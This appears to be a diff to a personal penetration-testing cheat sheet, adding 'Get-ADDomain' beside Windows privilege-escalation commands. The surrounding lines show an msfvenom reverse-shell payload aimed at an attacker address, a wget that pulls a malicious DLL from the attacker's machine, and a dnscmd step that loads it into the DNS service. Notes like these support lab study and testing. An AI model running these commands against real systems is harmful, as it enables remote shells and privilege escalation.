@@ -270,6 +270,7 @@ msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.15.61 LPORT=9001 -f
 python3 -m http.server <port> # local machine
 wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll" # take file from local machine
 Get-ADGroupMember -Identity DnsAdmins # Power Shell
+Get-ADDomain
 dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll # loading dll as non-privileged user
 wmic useraccount where name="<name_of_user" get sid # get sid of typed user
 sc.exe sdshow DNS # check perms of service
